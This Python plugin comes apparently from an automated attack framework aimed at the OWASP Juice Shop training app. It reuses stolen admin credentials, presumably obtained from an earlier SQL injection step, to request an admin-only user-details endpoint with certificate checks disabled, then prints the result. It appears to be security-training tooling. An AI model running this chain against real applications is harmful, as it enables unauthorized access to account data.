#from . import attack as a
import time
from plugins import attack as a
from plugins.header_config import *
import http.cookiejar as cookielib

class admin_section(a.attack_inter):
    def __init__(self):
        # First trying to load cookies from local cookie file
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/authentication-details'

    def generator(self):
        cookie, header = a.get_auth('admin')
        return cookie, header

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Admin_Section")
        a.logging.info(logger)
        a.logging.info('Started')
        cookie,header = self.generator()
        if cookie:
            response = self.juice_session.get(self.url, cookies=cookie, headers=header ,verify=False)
            #print(response.text)
            if response.status_code == 304 or response.status_code == 200:
                print("successfully get admin dashboard")
                print(response.text)
            print(response.status_code)
            a.logging.info('Finished')
        else:
            print("Not have authentification yet, please try SQL injection first")
            a.logging.info('Finished')




